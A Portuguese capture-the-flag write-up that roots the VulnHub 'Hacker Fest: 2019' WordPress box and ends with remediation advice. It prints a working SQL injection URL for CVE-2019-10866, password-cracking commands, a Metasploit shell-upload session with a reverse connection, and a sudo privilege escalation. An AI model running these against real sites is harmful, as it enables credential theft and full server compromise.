# Hacker Fest: 2019 — A Festa Começou com SQL e Terminou com Root

Hacker Fest: 2019 é uma box WordPress amigável para iniciantes que tem um impacto bem real. Um plugin Google Maps vulnerável com endpoint de SQL injection não autenticado entrega o hash do admin sem nem precisar fazer login. Quebre com rockyou, suba um shell PHP via Metasploit, e então aproveite o fato de que o webmaster pode literalmente rodar `sudo su` sem digitar senha. Uma box que acaba antes dos balões chegarem ao chão. Diversão legítima, rapaziada.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | Hacker Fest: 2019 |
| **VM Atacante** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/hacker-fest-2019,405/ |
| **Técnicas** | Recon Nmap, enumeração WordPress com WPScan, SQLi via REST API do plugin Google Maps, John the Ripper cracking de hash, Metasploit wp_admin_shell_upload, privesc via sudo su |
| **CVEs** | CVE-2019-10866 (SQLi no plugin WP Google Maps), CWE-269 (Gerenciamento Impróprio de Privilégios via sudo) |
| **Grupos APT** | APT41: explora plugins WordPress vulneráveis para acesso inicial em ataques a setores de mídia e supply chain; grupos Magecart: consistentemente alvejam plugins WordPress via SQL injection para colheita de credenciais |

---

## Resumo do Ataque

```
netdiscover + nmap → HTTP (80), FTP (21), SSH (22)
  |
  +--> WPScan → WordPress + Google Maps plugin v7.11.x (vulnerável)
          |
          +--> CVE-2019-10866 SQLi → hash do webmaster (MD5)
                  |
                  +--> John rockyou → senha em texto claro
                          |
                          +--> wp_admin_shell_upload (Metasploit) → Meterpreter (www-data)
                                  |
                                  +--> sudo -l → sudo su NOPASSWD → root
```

---

## Metodologia

1. Descoberta de hosts e enumeração de serviços
2. Fingerprinting do WordPress com WPScan
3. Identificar versão vulnerável do plugin Google Maps
4. Explorar endpoint SQLi para extrair hash do admin
5. Quebrar hash com John the Ripper e rockyou
6. Autenticar no painel admin do WordPress
7. Subir shell PHP reverso via módulo autenticado do Metasploit
8. Escalar via misconfiguration irrestrita de sudo

---

## Passo 1 — Descoberta de Hosts e Scan de Portas

```bash
sudo netdiscover -r 192.168.0.0/24
# Alvo: 192.168.0.20

nmap -sV -sC -A 192.168.0.20
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.x
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x (WordPress)
```

HTTP na porta 80 com WordPress sinaliza o caminho de ataque primário.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração WordPress com WPScan

```bash
wpscan --url http://192.168.0.20/ --enumerate u,p,t
```

O WPScan identifica:
- Versão do WordPress
- Plugins instalados: **WP Google Maps** versão 7.11.x (faixa vulnerável: 7.11.00-7.11.17)
- Usuários: `webmaster`

O plugin Google Maps nessa faixa de versão tem uma SQL injection não autenticada no endpoint da REST API do WordPress.

**MITRE ATT&CK:** T1595.002 — Escaneamento Ativo: Escaneamento de Vulnerabilidades

---

## Passo 3 — SQL Injection via Plugin Google Maps (CVE-2019-10866)

A vulnerabilidade existe na rota da REST API do WP Google Maps. Envie uma requisição criada para extrair a tabela de usuários do WordPress:

```bash
curl "http://192.168.0.20/?rest_route=/wpgmza/v1/markers&filter=%7B%22where%22%3A%22id%3D1+UNION+SELECT+1%2C2%2C3%2C4%2Cuser_pass%2Cuser_login%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26+FROM+wp_users--+-%22%7D"
```

A resposta inclui o hash do admin/webmaster em formato MD5 phpass:

```
webmaster:$P$B[hash]...
```

Salve:

```bash
echo 'webmaster:$P$B...' > /tmp/wp_hash.txt
```

**Nota do mundo real:** O CVE-2019-10866 afetou as versões 7.11.00 a 7.11.17 do WP Google Maps, um dos plugins WordPress mais populares com mais de 400.000 instalações ativas. Esse tipo de SQLi na REST API sem autenticação é exatamente o que grupos Magecart usam para extrair credenciais antes de implantar skimmers de pagamento.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Voltada ao Público; T1552.001 — Credenciais em Arquivos

---

## Passo 4 — Quebrar o Hash

O WordPress armazena senhas como hashes phpass baseados em MD5 (`$P$`). O John the Ripper lida com isso nativamente:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/wp_hash.txt
john --show /tmp/wp_hash.txt
```

```
webmaster:[senha]
```

**Alternativa:** `hashcat -m 400 /tmp/wp_hash.txt /usr/share/wordlists/rockyou.txt -w 3`

**MITRE ATT&CK:** T1110.002 — Força Bruta: Quebra de Senha

---

## Passo 5 — Subir Shell via Metasploit

Com credenciais válidas de admin WordPress, use o módulo de upload autenticado do Metasploit:

```bash
msfconsole -q
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS 192.168.0.20
set USERNAME webmaster
set PASSWORD [senha_crackeada]
set LHOST [ip_atacante]
run
```

O Metasploit autentica no WordPress, cria um plugin malicioso, faz upload e o ativa, entregando uma sessão Meterpreter como `www-data`.

```
meterpreter> getuid
Server username: www-data
```

**MITRE ATT&CK:** T1505.003 — Componente de Software do Servidor: Web Shell

---

## Passo 6 — Escalação de Privilégios via sudo su

```bash
meterpreter> shell
python -c 'import pty; pty.spawn("/bin/bash")'

sudo -l
# O usuário www-data pode executar os seguintes comandos:
# (ALL : ALL) NOPASSWD: /bin/su

sudo su
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
```

gg sem re. Root em segundos após o shell pousar. Caramba!

**Nota do mundo real:** `sudo su` com NOPASSWD é equivalente a dar a qualquer processo rodando como www-data um shell root sem senha. Em um servidor WordPress, isso significa que qualquer plugin malicioso ou upload de arquivo tem um caminho instantâneo para comprometimento total do sistema.

**MITRE ATT&CK:** T1548.003 — Mecanismo de Controle de Elevação: Sudo

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Método |
|---|---|---|---|
| Hash WordPress | $P$B[hash] | Tabela wp_users | CVE-2019-10866 SQLi |
| Credenciais | webmaster:[senha] | Quebrado do hash | John rockyou |
| Shell root | uid=0 | /bin/su via sudo | NOPASSWD sudo su |
| Flag root | {flag} | /root/flag.txt | sudo su → cat |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Takeaway Principal |
|---|---|---|---|
| 1 | SQLi não autenticada em plugin WordPress (CVE-2019-10866) | 400k+ instalações afetadas; roubo de credenciais sem autenticação | Mantenha plugins WordPress atualizados; use WAF com regras WordPress |
| 2 | Hash admin quebrado com rockyou | Senhas fracas para admins de CMS são consistentemente quebráveis | Enforce política de senhas fortes; use gerenciador de senhas para contas admin |
| 3 | Upload de plugin Metasploit funciona com credenciais admin válidas | Qualquer admin WordPress pode alcançar RCE via plugin malicioso | Restrinja instalação de plugins; implemente monitoramento de integridade de arquivos |
| 4 | `sudo su` NOPASSWD para www-data | Qualquer comprometimento web escalona imediatamente para root | Nunca conceda sudo a contas de serviço web |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Escaneamento Ativo | Escaneamento de Vulnerabilidades | T1595.002 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Voltada ao Público | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Quebra de Senha | T1110.002 |
| Persistência | Persistência | Web Shell | T1505.003 |
| Escalação de Privilégios | Escalação de Privilégios | Mecanismo de Controle de Elevação: Sudo | T1548.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Atualize WP Google Maps**: upgrade além da 7.11.17; aplique patch do CVE-2019-10866
2. **Enforce senhas fortes para admin WordPress**: mínimo 16 caracteres; bloqueie senhas comuns
3. **Restrinja instalação de plugins**: apenas o proprietário do site instala plugins; monitoramento de integridade em `/wp-content/plugins/`
4. **Remova sudo de www-data**: contas de serviço web nunca devem ter direitos sudo
5. **Implante WAF**: ModSecurity ou Cloudflare com ruleset WordPress para detectar padrões SQLi na REST API

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todas as instalações WordPress e plugins; rastrear CVEs por plugin |
| Proteger | Controle de Acesso | Remover sudo de contas de serviço web; enforce senhas fortes para admin |
| Proteger | Tecnologia de Proteção | Implantar WAF com regras WordPress; monitorar instalações de plugins |
| Detectar | Anomalias | Alertar em padrões SQLi na REST API; ativações inesperadas de plugins |
| Responder | Planejamento de Resposta | Desativar plugin vulnerável; rotacionar credenciais admin WordPress |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| CM-6 | Configurações | Sem sudo para contas de serviço web; apenas plugins atualizados |
| IA-5(1) | Autenticação Baseada em Senha | Senhas fortes para admin WordPress |
| SI-2 | Remediação de Falhas | Patch WP Google Maps; workflow de gestão de patches |
| AC-6 | Menor Privilégio | Permissões mínimas necessárias para processos WordPress |

---

## Considerações Finais

Hacker Fest: 2019 é uma box limpa e bem escopada para iniciantes que ensina uma cadeia de ataque real completa: CVE de plugin → quebra de hash → RCE autenticado → privesc sudo. Cada técnica aqui mapeia diretamente para como atores de ameaça reais comprometem sites WordPress.

A lição do CVE-2019-10866 é especialmente valiosa: um plugin com 400k instalações ativas, zero autenticação necessária, credenciais entregues via REST API. Isso não é um cenário CTF artificial, mano. Isso é uma terça-feira para uma equipe de pentest web.

Box sólida para qualquer um aprendendo a superfície de ataque WordPress. Sem exagero.

Thanks guys!! (❍ᴥ❍ʋ)
